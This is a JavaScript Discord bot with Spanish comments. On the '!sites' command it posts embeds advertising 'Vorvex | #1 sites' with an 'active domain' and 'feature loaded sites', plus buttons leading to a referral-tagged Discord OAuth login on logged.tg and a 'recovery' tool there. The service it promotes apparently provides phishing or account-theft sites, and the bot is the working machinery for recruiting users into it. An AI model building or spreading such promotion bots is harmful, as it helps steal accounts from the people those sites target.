console.log("TOKEN CARGADO:", process.env.TOKEN?.length);
const {
  Client,
  GatewayIntentBits,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  Events,
  ChannelType,
  PermissionsBitField,
  StringSelectMenuBuilder
} = require("discord.js");
require("dotenv").config();
const express = require("express");
const app = express();

app.get("/", (req, res) => res.send("Bot online"));
app.listen(process.env.PORT || 3000);

// ======== CLIENTE ÚNICO ========
const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers
  ]
});

client.once("ready", () => {
    console.log(`Bot conectado como ${client.user.tag}`);
});

client.on("messageCreate", async (message) => {

    if (message.author.bot) return;

    // 🔹 Cambia "!sites" por el comando que tú quieras
    if (message.content === "!sites") {

        // ─────────────────────────────────────────────
        // 🔥 EMBED 1 — Banner Glitch
        // ─────────────────────────────────────────────
        const topEmbed = new EmbedBuilder()
            .setColor(0x1e1f22)
            .setImage("https://media.discordapp.net/attachments/1282931466640167043/1444154250912600174/MOSHED-2025-11-28-21-33-5.gif?ex=694410b4&is=6942bf34&hm=ee1fa9b45b4797f741eee7200b9b70721eed0043ebc84fa81fcc93a369422df0&=&width=720&height=376"); // ← PON TU GIF AQUI


        // ─────────────────────────────────────────────
        // 🔥 EMBED 2 — Texto + Thumbnail + Imagen Horizontal
        // ─────────────────────────────────────────────
        const bottomEmbed = new EmbedBuilder()
            .setColor(0x1e1f22)
            .setTitle("**───<a:cruz1:1449079819102060677>`ᴠᴏʀᴠᴇx | #1 ꜱɪᴛᴇꜱ ───`**")
            .setThumbnail("https://media.discordapp.net/attachments/1367205588445958318/1367255025734127757/a_cfab732f7787ad3197eb7ae42d792b1d.gif?ex=69447578&is=694323f8&hm=11117705ee0cc15a5a75d7e10d755588afdce0ed83db78613d35b0308c863f6f&=&width=350&height=350") // ← ICONO DERECHA
            .setDescription(
`<a:gunlove:1449079953244160093> **1 ᴄᴜʀʀᴇɴᴛ ᴀᴄᴛɪᴠᴇ ᴅᴏᴍᴀɪɴ**

<a:Butterflyes:1449079464251097201> **ʙᴌᴀᴢɪɴɢ ꜰᴀꜱᴛ & ꜰᴇᴀᴛᴜʀᴇ ʟᴏᴀᴅᴇᴅ ꜱɪᴛᴇꜱ**
`)
            .setImage("https://media.discordapp.net/attachments/1367205588445958318/1367255026296426496/a_8028347d5921254ee6557ebaf2f337c4.gif?ex=69447578&is=694323f8&hm=cb8319a85940770464070b28606beb3b6afa4e74c09f8de44372940fee6a4bba&=&width=675&height=237"); // ← IMAGEN DE ABAJO


        // ─────────────────────────────────────────────
        // 🔥 BOTONES
        // ─────────────────────────────────────────────

        const buttons = new ActionRowBuilder().addComponents(

            // Botón 1 → Dashboard
            new ButtonBuilder()
                .setLabel("ᴅᴀꜱʜʙᴏᴀʀᴅ")
                .setStyle(ButtonStyle.Link)
                .setEmoji("<:emoji:1449079724440686794>") // ← TU EMOJI
                .setURL("https://discord.com/oauth2/authorize?client_id=1443059700311527586&redirect_uri=https://www.logged.tg/api/auth&response_type=code&scope=identify&prompt=none&state=eyJyZWZlcnJhbCI6InZvcnZleHgiLCJfX0xPQ0FMX1BBU1NFRCI6eyJfX0lOSVRJQUxfVVJMIjoiaHR0cHM6Ly93d3cubG9nZ2VkLnRnL2F1dGgvdm9ydmV4eCIsIl9fUkVESVJFQ1RfVVJMIjoiaHR0cHM6Ly93d3cubG9nZ2VkLnRnL2Rhc2hib2FyZCIsIl9fQ0FMTEJBQ0tfVVJMIjoiaHR0cHM6Ly93d3cubG9nZ2VkLnRnL2FwaS9hdXRoIiwiX19TV0FQX0hPU1QiOiJ3d3cubG9nZ2VkLnRnIn19"),

            // Botón 2 → Account Recovery
            new ButtonBuilder()
                .setLabel("ᴀᴄᴄᴏᴜɴᴛ ʀᴇᴄᴏᴠᴇʀʏ")
                .setStyle(ButtonStyle.Link)
                .setEmoji("<a:Starshy:1449078438085529610>") // ← TU EMOJI
                .setURL("https://href.li/?https://www.logged.tg/tools/recover")
        );


        // ─────────────────────────────────────────────
        // 📤 Enviar mensajes
        // ─────────────────────────────────────────────
        await message.channel.send({ embeds: [topEmbed] });

        // espacio EXTERNO (como en tu diseño anterior)
        await message.channel.send("‎");

        await message.channel.send({
            embeds: [bottomEmbed],
            components: [buttons]
        });

    }
});

client.login(process.env.TOKEN);